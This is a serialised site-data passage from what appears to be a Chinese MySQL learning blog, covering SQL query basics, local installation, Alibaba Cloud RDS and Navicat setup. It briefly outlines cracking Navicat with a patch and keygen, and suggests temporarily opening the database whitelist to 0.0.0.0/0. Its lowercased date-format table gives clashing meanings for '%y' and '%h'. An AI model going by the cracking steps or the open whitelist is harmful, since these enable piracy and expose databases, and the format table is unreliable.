取别名，省略as，别名最好是加上双引号，因为可能是多单词组成\nselect salary \"out put\" from employees;\n# concat()搭配别名使用\nselect concat(last_name,first_name) as \"姓名\" from employees;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n去重：在某些表里，在查询一些字段的值时结果可能会出现重复，那么我们可以使用distinct关键字了。\n\n# 使用distinct关键字进行查询结果去重\nselect distinct department_id from employees;\n\n\n1\n2\n\n\n+加号：+在mysql中的作用是加号运算\n\n * 如果两个都是数值型，就只加做加法运算 select 10+90 as \"结果\"\n * 只有其中一个为null，那结果就是null select null+90 as \"结果\"\n * 如果其中一个是数值型，另一个是数值型字符，那就会将数值型字符转为对应数值，再做加法运算。 select '10'+90 as \"结果\"\n * 如果其中一个是数值型，另一个是非数值字符型，那就会将非数值字符型转为数值0，再做加法运算。 select 'john'+90 as \"结果\"\n\n\n# 条件查询\n\n条件查询就是字面意思，按照某些条件进行查询。\n\n写法：select 查询列表 from 表名 where 条件。\n\n\n# 普通条件查询\n\n普通条件查询一般是按照“条件”进行查询，它会用到条件运算符：>、<、=、<=、>=、<>、!=。（“不等于”建议使用<>）\n\n一旦“条件”很复杂，满足所有条件、满足其中一个条件、相反条件等，就会用到逻辑运算符：and、or、not、&&、||、!。（建议使用前三个）\n\n# >、<：查询工资大于12000的员工信息\nselect * from employees where salary > 12000;\n# <>、!=：查询部门编号不等于90号的员工名和部门编号。`<>`也可以用`!=`，最好用前者\nselect last_name,department_id from employees where department_id<>90;\n# and、&&：查询工资在10000到20000之间的员工名、工资。`and`也可以用`&&`，最好用前者\nselect last_name,salary from employees where salary>=10000 and salary<=20000;\n# or：查询部门编号不是在90到110之间，或者工资高于15000的员工信息\nselect * from employees where department_id<90 or department_id>110 or salary>15000;\n# not、and、or：同上例\nselect * from employees where not(department_id>=90 and department_id<=110) or salary>15000;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 模糊查询\n\n模糊查询是“条件”很简略，可能是字段值的某一部分，也可能是在一个范围内。它有like、between and、in、is null、is not null几种模糊查询类型。\n\n 1. like:一般和通配符搭配使用，通配符%表示任意多个字符，_表示任意单个字符。如果需要区分大小写，可以在like后追加binary关键字。如果需要查_本身这个符号，可以使用转译\\_（或者用escape关键字指定某个字符代表\\，该字符没有字符原来意义了而是具有了转译功能）。\n    \n    # %为任意多个字符：查询员工名中包含字符a的员工信息\n    select * from employees where last_name like '%a%';\n    # _为任意单个字符：查询员工名中第三个字符是e第五个字符是n的员工信息\n    select * from employees where last_name like '__e_n%';\n    # 加上binary可区分大小写：查询员工名中第四个字符是大写h的员工信息\n    select * from employees where last_name like binary '___h%';\n    # 使用\\进行转译：查询员工名中第二个字符是_的员工信息\n    select * from employees where last_name like '_\\_%';\n    # 使用escape指定某字符具有转译功能，该字符本身已经不是它原来的意思了。本例同'_\\_%'一样。\n    select * from employees where last_name like '_a_%' escape 'a';\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    \n\n 2. between and：范围查询，它相当于xx >= 下限 and xx <= 上限，只是between 下限 and 上限更简洁，between and会包含上下限这两个临界值。\n    \n    # between and（包含临界值）：查询工资在10000到20000之间的员工名、工资\n    select last_name,salary from employees where salary between 10000 and 20000;\n    \n    \n    1\n    2\n    \n\n 3. in：相当于xx=值1 or xx=值2 or xx=值3，用in的写法会更简洁，in(值1,值2,值3)，只是“值123”的类型要一致或者兼容（可隐式转换），还有“值123”不要使用通配符，因为in实际是=形式的，不是like所以不能用通配符。\n    \n    # in：查询员工工种编号是it_prog或者ad_vp或者st_man的员工信息\n    select * from employees where job_id in('it_prog','ad_vp','st_man');\n    \n    \n    1\n    2\n    \n\n 4. is null和is not null：判断字段值是否为null的。\n    \n    # is null和is not null：查询奖金为空的员工信息\n    select * from employees where commission_pct is null;\n    \n    \n    1\n    2\n    \n    \n    说到is null，其实它可以用安全等于<=>实现。is null只能用在null的场景，而<=>可以适用于null也可以适用于具体值场景。\n    \n    # <=>是安全等于，用于判断是否等于null，也可用于是否等于一个具体值，但是用得很少\n    select * from employees where commission_pct <=> null;\n    select * from employees where salary <=> 12000;\n    \n    \n    1\n    2\n    3\n    \n\n\n# 排序查询\n\n排序：我们有时候需要把查询结果按照一个字段值的升序或降序进行排列展示，那我们可以使用order by关键字了。asc升序（默认），desc是降序。order by支持单字段、多字段、表达式、函数、别名。order by字句一般放在查询语句的最后面（但limit字句比它更靠后）。\n\n 1. 普通排序\n    \n    # 使用order by进行排序，asc升序（默认），desc是降序\n    select * from employees order by salary;\n    # 加上where条件进行排序查询\n    select * from employees where salary>=12000 order by salary;\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 2. 按表达式排序\n    \n    # 按表达式排序：按年薪的高低显示员工信息和年薪\n    select *, salary*12*(1+ifnull(commission_pct,0))\n    from employees\n    order by salary*12*(1+ifnull(commission_pct,0)) desc;\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 3. 按别名排序\n    \n    # 按别名排序：按年薪的高低显示员工信息和年薪\n    select *, salary*12*(1+ifnull(commission_pct,0)) 年薪\n    from employees\n    order by 年薪 desc;\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 4. 按函数排序\n    \n    # 按函数排序：按姓名的长度显示员工的姓名和工资\n    select length(last_name) 字节长度,last_name,salary\n    from employees\n    order by length(last_name) desc;\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 5. 按多个字段排序\n    \n    # 按多个字段排序：查询员工信息，先按工资降序排序，再按员工编号升序排序\n    select * from employees order by salary desc, employee_id asc;\n    \n    \n    1\n    2\n    \n\n\n# 常见函数\n\n常见函数一般分为：单行函数和分组函数。单行函数是处理数据用的，分组函数是统计数据用的，所以分组函数还叫统计函数、聚合函数或者组函数。\n\n\n# 单行函数\n\n 1. 字符函数\n    \n    * length()：获取参数值的字节个数。要注意不是字符长度。\n    * concat()：拼接字符串。\n    * upper()和lower()：前者是将字母都变为大写，后者是将字母都变为小写。\n    * substr()或substring()：这两个一样，截取字符串。\n    * instr()：查询子串在字符串的索引位置（类似js的indexof()）。\n    * trim()：去掉字符串前后空格。如果使用form可以去掉前后指定字符。\n    * lpad()和rpad()：用指定字符进行左填充（rpad是右填充），最后达到指定字符长度。\n    * replace()：替换字符串中的指定的字符。\n    \n    # length函数：获取参数值的字节个数。\n    select length(last_name) from employees;\n    # concat函数：拼接字符串。\n    select concat(last_name,'_',first_name) from employees;\n    # upper和lower函数：前者是将字母都变为大写，后者是将字母都变为小写。\n    select upper(last_name),lower(first_name) from employees;\n    # substr或substring函数：截取字符串，第二个参数是起始点，第三个参数是截取长度\n    select last_name, substr(last_name,1,3) from employees; # mysql索引是从1开始的\n    # instr函数：查询子串在字符串的索引位置\n    select instr('akldmfasdfabodfng','mfa');\n    # trim函数：去掉前后空格（或指定字符）\n    select trim('  a  s    ');\n    select trim('g' from 'gggggaggggsggggg');\n    # lpad函数：用指定字符进行左填充（rpad是右填充），最后达到指定字符长度\n    select lpad('abc',10,'*'), rpad('abc',10,'*');\n    # replace函数：替换字符串中的指定的字符\n    select replace('abcabcabc','abc','def');\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    \n\n 2. 数学函数\n    \n    * round()：四舍五入，第二个参数是指定保留小数点后的位数。\n    * ceil()：向上取整，返回>=该参数的最小整数。\n    * floor()：向下取整，返回<=该参数的最大整数。\n    * truncate()：截断小数位，会指定截断到小数点后的位数。\n    * mod()：取余，mod(a,b)相当于a - a/b*b。\n    \n    # round函数：四舍五入，第二个参数是指定保留小数点后的位数\n    select round(1.42), round(-1.56), round(1.567,2);\n    # ceil函数：向上取整，返回>=该参数的最小整数\n    select ceil(1.00), ceil(1.02), ceil(-1.02);\n    # floor函数：向下取整，返回<=该参数的最大整数\n    select floor(2.00), floor(2.98), floor(-2.98);\n    # truncate函数：截断小数位，会指定截断到小数点后的位数\n    select truncate(1.6999, 0), truncate(1.6999, 2);\n    # mod函数：取余，`mod(a,b)`相当于`a - a/b*b`\n    select mod(10,3),mod(10,-3),mod(-10,3),mod(-10,-3);\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    \n\n 3. 日期函数\n    \n    * now()：返回当前系统日期+时间。\n    * curdate()：返回当前系统日期，不包括时间。\n    * curtime()：返回当前系统时间，不包括日期。\n    * str_to_date()：按照指定格式来解析日期+时间。\n    * date_format()：将日期按照指定格式来转换。\n    * year()：获取参数值的年部分。\n    * month()和monthname()：获取参数值的月部分。\n    * day()：获取参数值的日部分（一个月的第几天）。\n    * hour：获取参数值的小时部分。\n    * minute：获取参数值的分钟部分。\n    * second：获取参数值的秒部分。\n    * date()：获取参数值的整体日期部分，不包括时间。\n    \n    str_to_date()和date_format()中会涉及的“格式”，经常会用到的一些格式符如下表：\n    \n    格式符   功能\n    %y    四位年份\n    %y    两位年份\n    %m    月份（01,02,03...12）\n    %c    月份（1,2,3...12）\n    %d    月份中的第几天（01,02,03...31）\n    %e    月份中的第几天（1,2,3...31）\n    %h    小时（24小时制，00,02,03...23）\n    %k    小时（24小时制，0,1,2,3...23）\n    %h    小时（12小时制，01,02,03...12）\n    %l    小时（12小时制，1,2,3...12）\n    %i    分钟（01,02,03...59）\n    %s    秒（01,02,03...59）\n    %p    am 或者 pm\n    %w    星期几（0=星期日.. 6=星期六）\n    %w    星期几（sunday.. saturday）\n    \n    # now函数返回当前系统日期+时间，curdate只返回日期，curtime只返回时间\n    select now(),curdate(),curtime();\n    # str_to_date函数：按照指定格式来解析日期+时间\n    select str_to_date('1992-8-15','%y-%c-%d'),str_to_date('1992-08-15','%y-%m-%d');\n    # 查询入职日期为1992-4-3的员工信息\n    select * from employees where hiredate = str_to_date('4-3 1992','%c-%d %y');\n    # date_format函数：将日期按照指定格式来转换\n    select date_format(now(), '%y年%c月%e日');\n    # 查询有奖金的员工名和入职日期（xx月/xx日 xx年）\n    select last_name as 员工名,date_format(hiredate, '%m月/%d日 %y年') 入职时间\n    from employees where commission_pct is not null;\n    # year和day函数：获取年和日\n    select year(now()),month(now()),monthname(now()),\n    day(now()),hour(now()),minute(now()),second(now());\n    # date获取整体的日期，不包括时间\n    select date(now());\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    \n\n 4. 流程控制函数\n    \n    * if(expr1,expr2,expr3)：如果expr1为true，就返回expr2，否则返回expr3。\n    \n    * case()有两种写法：\n      \n      # 这种写法的逻辑类似于`switch case`等值判断\n      case 要判断的字段或表达式\n      when 常量1 then 要显示的值1（在存储过程中是语句）\n      when 常量2 then 要显示的值2（在存储过程中是语句）\n      ...\n      else 要显示的值n（在存储过程中是语句）\n      end\n      \n      \n      1\n      2\n      3\n      4\n      5\n      6\n      7\n      \n      \n      # 这种写法的逻辑类似于`if else if else`这种区间判断\n      case\n      when 条件1 then 要显示的值1（在存储过程中是语句）\n      when 条件2 then 要显示的值2（在存储过程中是语句）\n      ...\n      else 要显示的值n（在存储过程中是语句）\n      end\n      \n      \n      1\n      2\n      3\n      4\n      5\n      6\n      7\n      \n    \n    * 例子：\n      \n      # if(expr1,expr2,expr3)：如果expr1为true，就返回expr2，否则返回expr3\n      select if(10>5,'真的','假的');\n      # 使用if给员工奖金加备注\n      select last_name, if(commission_pct is null, '没有奖金', '有奖金') as 奖金 from employees;\n      # case函数：类似于js中switch和if else。\n      /*\n      查询员工的工资，要求\n      部门号=30，显示的工资为1.1倍\n      部门号=40，显示的工资为1.2倍\n      部门号=50，显示的工资为1.3倍\n      其他部门，显示的工资为原工资\n      */\n      select salary as 原工资, department_id,\n      case department_id\n      when 30 then salary*1.1\n      when 40 then salary*1.2\n      when 50 then salary*1.3\n      else salary\n      end as 新工资 from employees;\n      /*\n      查询员工工资情况\n      如果工资>20000，显示a级别\n      如果工资>15000，显示b级别\n      如果工资>10000，显示c级别\n      否则，显示d级别\n      */\n      select salary 工资,\n      case\n      when salary>20000 then 'a'\n      when salary>15000 then 'b'\n      when salary>10000 then 'c'\n      else 'd'\n      end as 工资级别 from employees;\n      \n      \n      1\n      2\n      3\n      4\n      5\n      6\n      7\n      8\n      9\n      10\n      11\n      12\n      13\n      14\n      15\n      16\n      17\n      18\n      19\n      20\n      21\n      22\n      23\n      24\n      25\n      26\n      27\n      28\n      29\n      30\n      31\n      32\n      33\n      \n\n\n# 分组函数\n\n分组函数用作统计使用，又称为聚合函数或统计函数或组函数。\n\n分组函数常见的有：sum求和、avg平均值、max最大值、min最小值、count计算个数。\n\n# sum函数：求和。求所有员工工资总和\nselect sum(salary) from employees;\n# avg函数：求平均值。求员工工资的平均值\nselect avg(salary) from employees;\n# min函数：求最小值。求员工中工资最小的\nselect min(salary) from employees;\n# max函数：求最大值。求员工中工资最大的\nselect max(salary) from employees;\n# count函数：有多少个非空数据行。求有多少员工有工资信息\nselect count(salary) from employees;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n分组函数使用特点：\n\n 1. sum、avg一般用于处理数值型；max、min、count可以处理任何类型。\n    \n    # sum函数和avg函数一般处理数值型，处理其他的虽然不报错但没什么意义\n    select sum(last_name),avg(last_name) from employees;\n    select sum(hiredate),avg(hiredate) from employees;\n    # min函数、max函数和count函数可以处理任何类型\n    select max(last_name),min(last_name) from employees;\n    select max(hiredate),min(hiredate) from employees;\n    # count函数只统计非空的数据\n    select count(last_name) from employees;\n    select count(commission_pct) from employees;\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    \n\n 2. 分组函数都会忽略null值。\n    \n    # sum函数和avg函数都会忽略null值。null+任何值都是null。平均值实际除以的是35，不包括null行\n    select sum(commission_pct),avg(commission_pct),sum(commission_pct)/35 from employees;\n    # max函数和min函数都会忽略null值。不然最大最小值就会有null。\n    select max(commission_pct),min(commission_pct) from employees;\n    # count函数只统计非空的数据\n    select count(last_name) from employees;\n    select count(commission_pct) from employees;\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    \n\n 3. 分组函数可以搭配distinct使用，一般是count函数和distinct搭配使用的多。\n    \n    # 分组函数可搭配distinct使用，主要是count函数搭配它。查询工资有几种\n    select count(distinct salary),count(salary) from employees;\n    \n    \n    1\n    2\n    \n\n 4. 统计表的行数，可以用count(*)、count(常量)、count(列名)，其中count(*)用得最多。\n    \n    # 用count统计表的函数，有`count(*)`、`count(常量)`、`count(列名)`三种\n    select count(employee_id) from employees;\n    # count(*)表示这一行里只有一列的值不为null就统计上\n    select count(*) from employees;\n    # count(1)其实是临时加了一列，然后让这一列所有行的值都为1，并统计总行数\n    select count(1) from employees;\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    \n\n 5. 和分组函数一同查询的字段有限制（一般是group by后的字段）\n    \n    # 和分组函数一同查询的字段有限制。这个employee_id查出来就没有意义了\n    select avg(salary), employee_id from employees;\n    \n    \n    1\n    2\n    \n\n\n# 分组查询\n\n分组查询是对表按照某个列进行分组，再对每组的情况进行一个统计（每组的某列的平均值、最大最小值等）。\n\n\n# 分组查询简单使用\n\n写法：\n\nselect 分组函数, 列（要求出现在group by的后面）\nfrom 表名\n【where 筛选条件】\ngroup by 分组的列表\n【order by 字句】\n\n\n1\n2\n3\n4\n5\n\n\n我们可以看到上面写法中的查询列表是“分组函数”和“列”。这个“列”就是group by后面的字段，表示按照什么字段进行分组；这个“分组函数”就是对组里的什么字段进行一个什么样的统计。\n\n# 查询每个工种的最高工资。\nselect max(salary), job_id  # 统计每组的最高的salary\nfrom employees\ngroup by job_id;            # 按照job_id进行分组\n# 查询每个位置上的部门个数\nselect count(*),location_id\nfrom departments\ngroup by location_id;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 添加筛选条件\n\n分组查询中的筛选条件分为两类：\n\n        数据源       位置              关键字\n分组前筛选   原始表       group by子句的前面   where\n分组后筛选   分组后的结果集   group by子句的后面   having\n\n使用注意点：\n\n * 分组函数做条件肯定是放在having字句中的，也就是“分组后筛选”\n * 能用分组前筛选的，就优先考虑使用分组前筛选。\n\n添加分组前筛选例子：\n\n# 查询邮箱中包含a字符的，每个部门的平均工资\nselect avg(salary), department_id\nfrom employees\nwhere email like '%a%'\ngroup by department_id;\n# 查询有奖金的，每个领导手下员工的最高工资\nselect max(salary),manager_id\nfrom employees\nwhere commission_pct is not null\ngroup by manager_id;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n添加分组后筛选（使用having关键字）例子：\n\n# 查询哪个部门的员工个数>2（分组后的刷选）\nselect count(*), department_id\nfrom employees\ngroup by department_id\nhaving count(*) > 2;\n# 查询每个工种有奖金的员工的最高工资>12000的工种编号和最高工资\nselect max(salary), job_id\nfrom employees\nwhere commission_pct is not null\ngroup by job_id\nhaving max(salary) > 12000;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n#\n\n\n# 连接查询\n\n\n# 子查询\n\n\n# 分页查询\n\n\n# 联合查询\n\n\n# 查询总结",charsets:{cjk:!0}},{title:"学习mysql的准备工作",frontmatter:{},regularPath:"/book-web/web%E5%90%8E%E7%AB%AF/%E5%AD%A6%E4%B9%A0mysql/%E5%AD%A6%E4%B9%A0mysql%E7%9A%84%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C.html",relativePath:"book-web/web后端/学习mysql/学习mysql的准备工作.md",key:"v-334ea931",path:"/book-web/web%E5%90%8E%E7%AB%AF/%E5%AD%A6%E4%B9%A0mysql/%E5%AD%A6%E4%B9%A0mysql%E7%9A%84%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C.html",headers:[{level:2,title:"mysql简介",slug:"mysql简介",normalizedTitle:"mysql简介",charIndex:19},{level:2,title:"一些概念",slug:"一些概念",normalizedTitle:"一些概念",charIndex:185},{level:2,title:"本地安装mysql",slug:"本地安装mysql",normalizedTitle:"本地安装mysql",charIndex:579},{level:2,title:"云厂商mysql",slug:"云厂商mysql",normalizedTitle:"云厂商mysql",charIndex:3577},{level:2,title:"数据库客户端navicat",slug:"数据库客户端navicat",normalizedTitle:"数据库客户端navicat",charIndex:4026},{level:2,title:"navicat连接阿里云mysql",slug:"navicat连接阿里云mysql",normalizedTitle:"navicat连接阿里云mysql",charIndex:4375},{level:2,title:"建库建专用用户",slug:"建库建专用用户",normalizedTitle:"建库建专用用户",charIndex:5370}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"mysql简介 一些概念 本地安装mysql 云厂商mysql 数据库客户端navicat navicat连接阿里云mysql 建库建专用用户",content:"# 学习mysql的准备工作\n\n\n# mysql简介\n\nMySql是web server中最流行的关系型数据库管理系统（RDBMS）。官网可免费下载，仅用于学习；它是轻量级的，易学易用。\n\n为何使用 MySql 而不是 mogondb：\n\n * MySql是企业内最常用的存储工具，一般都有专人运维。\n * MySql也是社区最常用的存储工具，有问题随时可查。\n\n\n# 一些概念\n\n 1. 关系：描述两个集合的元素，如何相互联系或者一一对应的数学概念。\n 2. 数据库：用于存放数据、访问数据和操作数据的存储仓库。\n 3. RDBMS：就是关系型数据库管理系统，比如DB2、Oracle和MySQL。\n 4. 数据库实例：是数据库在服务器中实际运行的一个进程，用来加载数据库。\n 5. sql：英文全称是Structured Query Language，中文名是结构化查询语言。是用于管理关系数据库管理系统的一种计算机语言。\n 6. sql主要分为数据定义语言(DDL)和数据操作语言(DML)。在有些资料里会将查询操作从DML里分出来，叫做数据查询语言(DQL)。其实sql还有数据控制语言(DCL)，在有些资料里会将Commit、Rollback（事务的提交和回滚）、SavePoint设置保存点从DCL中分出来，叫做事务控制语言(TCL)。\n\n\n# 本地安装mysql\n\n如果是使用云厂商的mysql数据库可以跳过本小节直接看下一节内容。\n\nmysql下载：\n\n 1. 我们打开https://dev.mysql.com/downloads/mysql/网址，可能需要代理上网。\n 2. 其中Select Operating System是选择你的操作系统类型。\n 3. 然后我们没有选择Installer类型的安装包，我们选择的是Windows (x86, 64-bit), ZIP Archive这种解压包。并且我们暂时也用不着Debug Binaries & Test Suite类型的解压包。\n 4. 点击Download然后会跳转到一个页面，我们选择最底部的No thanks, just start my download.也就是不使用登录用户下载。\n\nmysql安装：\n\n 1. 解压下载后的zip，如下图。\n\n 2. 配置环境变量，将mysql文件夹下的bin路径添加到变量值中，注意得用;分隔（win10会智能一点）。右击“我的电脑”——选择“属性”——选择“高级系统设置”——选择“高级”——选择“环境变量”。在“系统变量”中选中“Path”进行编辑。\n    \n\n 3. 配置初始化的my.ini文件，在mysql目录里新增my.ini文件\n    \n    [client]\n    # 设置客户端的端口号\n    port=3306\n    # 设置客户端默认字符集\n    default-character-set=utf8\n    [mysql]\n    # 设置mysql客户端默认字符集\n    default-character-set=utf8\n    [mysqld]\n    # 设置mysql服务运行时的端口号\n    port=3306\n    # 设置mysql的安装目录，双斜杠\n    basedir=D:\\\\mysql-8.0.27-winx64\n    # 设置mysql的数据存放目录\n    datadir=D:\\\\mysql-8.0.27-winx64\\\\data\n    # 允许最大连接数，如果出现Too Many Connections的错误就需要增加最大连接数\n    max_connections=200\n    # 允许连接失败的次数。防止被攻击，超过会禁止host连接，重启mysql服务器或flush hosts命令可让host继续连接\n    max_connect_errors=10\n    # 数据库和数据库表的默认字符集(mysql服务端)，utf8是3字节的，utf8mb4是4字节的可以支持一些Emoji表情\n    character-set-server=utf8mb4\n    # 数据库字符集对应一些排序规则,要属于character-set-server对应值的集合内\n    collation-server = utf8mb4_general_ci\n    # 设置client连接mysql时的字符集,防止乱码\n    init_connect='SET NAMES utf8mb4'\n    # 创建新表时将使用的默认存储引擎\n    default-storage-engine=INNODB\n    # 默认使用mysql_native_password插件认证\n    default_authentication_plugin=mysql_native_password\n    # MySQL连接闲置超过一定时间后(单位：秒)将会被强行关闭\n    wait_timeout = 1800\n    # MySQL默认的wait_timeout 值为8个小时，interactive_timeout参数需要同时配置才能生效\n    interactive_timeout = 1800\n    # 大小写不敏感：1，大小写敏感0\n    lower_case_table_names=0\n    #限制单个文件大小,默认1G,太大了\n    max_binlog_size = 100M\n    # 数据库错误日志文件\n    log_error=D:\\\\mysql-8.0.27-winx64\\\\log\\\\error.log\n    # 设置临时表最大值，这是每次连接都会分配，不宜设置过大 max_heap_table_size 和 tmp_table_size 要设置一样大\n    max_heap_table_size = 2048M\n    tmp_table_size = 2048M\n    # 每个连接都会分配的一些排序、连接等缓冲，一般设置为 2MB 就足够了\n    sort_buffer_size = 2M\n    join_buffer_size = 2M\n    read_buffer_size = 2M\n    read_rnd_buffer_size = 2M\n    # 0,每秒写一次log,并flush到磁盘；1,每次事务提交时，写log,同时flush到磁盘；2,每次事务提交时写log,每秒flush一次到磁盘\n    innodb_flush_log_at_trx_commit = 1\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    33\n    34\n    35\n    36\n    37\n    38\n    39\n    40\n    41\n    42\n    43\n    44\n    45\n    46\n    47\n    48\n    49\n    \n\n 4. 安装mysql，先以管理员身份运行cmd。\n    \n    * 进入到mysql安装目录下，输入mysqld --install来安装mysql服务。\n    * 然后输入mysqld --initialize --console来初始化mysql，会出现A temporary password is generated for root@localhost:，它的后面就是root用户的初始密码，一定要记住。\n    * 输入net start mysql开启mysql服务（如果失败了，那就输入mysqld --remove卸载mysql服务，再重新安装），如果输入net stop mysql这是停止mysql服务。\n    * 输入mysqladmin -u用户名 -p旧密码 password 新密码来修改那个初识密码，例如mysqladmin -uroot -p123456 password 123。输入mysql -u root -p也可以修改密码。\n\n\n# 云厂商mysql\n\n我们上线的项目是站库分离的，也就是后端代码与数据库不在同一台服务器上。这样的好处是减轻本地个人计算机的压力，云厂商的云数据库可以存放正开发的数据库，也可以存放已经上线的数据库，也就是它可以存放不同项目不同状态的数据库，更好的维护。况且云数据库也很便宜，新人优惠买3年也只要60元，双十一每年也只要10块钱。\n\n我们以阿里云为例，进入https://www.aliyun.com/product/rds/mysql这个网站，新用户会有优惠活动。\n\n\n\n如果你不是新用户，那就只能点击页面顶部的“立即购买”按照原价来购买了。例如下面这种，买的一个月的，一核一G，只有20G存储空间，我选的是在上海的mysql云数据库（选里你近的）。\n\n\n\n\n购买完成后进入https://rdsnext.console.aliyun.com/dashboard页面，然后按照下图可以完成创建账户和数据库以及连接数据库。（查询MYSQL数据库版本SELECT VERSION()）\n\n\n\n\n\n\n\n# 数据库客户端navicat\n\n我们使用的数据库客户端是Navicat，navicat的下载安装可以去navicat官网下载Navicat Premium 15的试用版，破解的话可以看知乎的这篇文章。\n\nnavicat破解：选择版本，选择navicat.exe，补丁，注册码生成，复制请求码，激活码生成。\n\nnavicat的基本设置在“工具-选项”里：\n\n * 布景主题：深色\n * 启动画面：从上次离开的画面继续\n * 查询：在关闭前提示保存新建的查询或配置文件，自动保存间隔修改为60s\n * 常规颜色：220,220,170\n * 关键字颜色：86,156,214\n * 字符串颜色：206,145,120\n * 数字颜色：181,206,168\n * 注释颜色：106,153,85\n\n\n# navicat连接阿里云mysql\n\n在项目上线时，我们是将代码部署到云厂商的云服务器上的，然后云服务器也是可以安装mysql的（跟第一节内容差不多），也就是站库不分离的。使用数据库客户端连接数据库，要通过云服务器的外网地址与连接，具体就不展开，因为我们使用的是站库分离的方式。\n\n站库分离，到时候云服务器要通过内网地址与云数据库进行连接，这个也不展开了。而在我们本地开发项目时（还未上线正在开发中），需要使用数据库客户端navicat连接云数据库的，这要通过云数据库的外网地址。\n\nnavicat连接阿里云云数据库mysql步骤：\n\n * 首先进入阿里云工作台的资源实例视图，进入你的阿里云mysql的实例。\n * 然后查看我们的mysql实例的连接详情，我们需要申请一下外网地址（点击“申请外网地址”按钮即可），然后还要设置一下白名单。\n * 阿里云mysql白名单的设置，首先把default的127.0.0.1改为ecs私网地址（因为我们是站库分离的，如果没有ecs就改成其他的IP，只要不是127.0.0.1就行），再设置一个自己电脑IP地址（该IP是你自己电脑的公网IP，在百度上查询自己电脑的公网IP，像我用的长城宽带，IP几乎每天都不一样）。 阿里云mysql白名单设置\n * 设置完白名单后再点击“查看连接详情”，就能看到阿里云mysql的外网地址了。 已获取阿里云mysql外网地址\n * 在navicat面板里找到“连接-阿里云-阿里云云数据库MySql版” navicat连接阿里云mysql\n * 在“新建连接”里，连接名随意填，主机名就是阿里云mysql的外网地址，端口号一般是3306（上一步也能看到端口号），用户名和密码在阿里云mysql数据库这一节的“创建账号”里说过了，最好用阿里云mysql的高权限账号，比如我的是admin_liawn。 navicat新建连接\n * 创建好连接后你可以点击一下“测试连接”按钮，如果不成功，很有可能是你的阿里云mysql白名单设置有问题，可以暂时把白名单设置成0.0.0.0/0，直到你真的弄清楚你本地的公网地址，再把0.0.0.0/0改为你的公网地址。如果成功，保存连接，在navicat面板右击连接名，然后选择“打开连接”。 进行连接阿里云mysql\n * 如果还有问题，可以查看解决无法连接实例问题。\n\n\n# 建库建专用用户\n\n可以直接在阿里云mysql里建库，也可以通过navicat连接阿里云mysql之后，在navicat上进行建库。这里讲第二种，我们右击“阿里云MySql”（名字是在创建连接时随意取的），然后选择“新建数据库”。我们新建数据库blog_dev用于开发环境，字符集使用utf8mb4（支持复杂的Unicode）。\n\n\n\n\n然后我们给新数据库blog_dev新建一个专用的“用户”，这个用户只能操作阿里云mysql里的这个blog_dev数据库，其他数据库没有权限。\n\n\n\n如果点击“用户”报1142 - SELECT command denied to user错误，那表示你没有权限，要将“阿里云MySql”这个连接信息的用户名改为阿里云mysql的高权限账号，比如我的高权限账号是admin_liawn。\n\n\n等专用用户创建成功后，我们再将连接信息的用户改为这个专用用户。\n\n常用的系统类函数以及sql\n\n * version()：查看数据库版本号。SELECT VERSION();\n * database()：查看当前库。SELECT DATABASE();\n * user()：查看当前用户。SELECT USER();\n * SHOW DATABASES：查看所有数据库。\n * SHOW TABLES：查看当前库里的所有表。",normalizedContent:"# 学习mysql的准备工作\n\n\n# mysql简介\n\nmysql是web server中最流行的关系型数据库管理系统（rdbms）。官网可免费下载，仅用于学习；它是轻量级的，易学易用。\n\n为何使用 mysql 而不是 mogondb：\n\n * mysql是企业内最常用的存储工具，一般都有专人运维。\n * mysql也是社区最常用的存储工具，有问题随时可查。\n\n\n# 一些概念\n\n 1. 关系：描述两个集合的元素，如何相互联系或者一一对应的数学概念。\n 2. 数据库：用于存放数据、访问数据和操作数据的存储仓库。\n 3. rdbms：就是关系型数据库管理系统，比如db2、oracle和mysql。\n 4. 数据库实例：是数据库在服务器中实际运行的一个进程，用来加载数据库。\n 5. sql：英文全称是structured query language，中文名是结构化查询语言。是用于管理关系数据库管理系统的一种计算机语言。\n 6. sql主要分为数据定义语言(ddl)和数据操作语言(dml)。在有些资料里会将查询操作从dml里分出来，叫做数据查询语言(dql)。其实sql还有数据控制语言(dcl)，在有些资料里会将commit、rollback（事务的提交和回滚）、savepoint设置保存点从dcl中分出来，叫做事务控制语言(tcl)。\n\n\n# 本地安装mysql\n\n如果是使用云厂商的mysql数据库可以跳过本小节直接看下一节内容。\n\nmysql下载：\n\n 1. 我们打开https://dev.mysql.com/downloads/mysql/网址，可能需要代理上网。\n 2. 其中select operating system是选择你的操作系统类型。\n 3. 然后我们没有选择installer类型的安装包，我们选择的是windows (x86, 64-bit), zip archive这种解压包。并且我们暂时也用不着debug binaries & test suite类型的解压包。\n 4. 点击download然后会跳转到一个页面，我们选择最底部的no thanks, just start my download.也就是不使用登录用户下载。\n\nmysql安装：\n\n 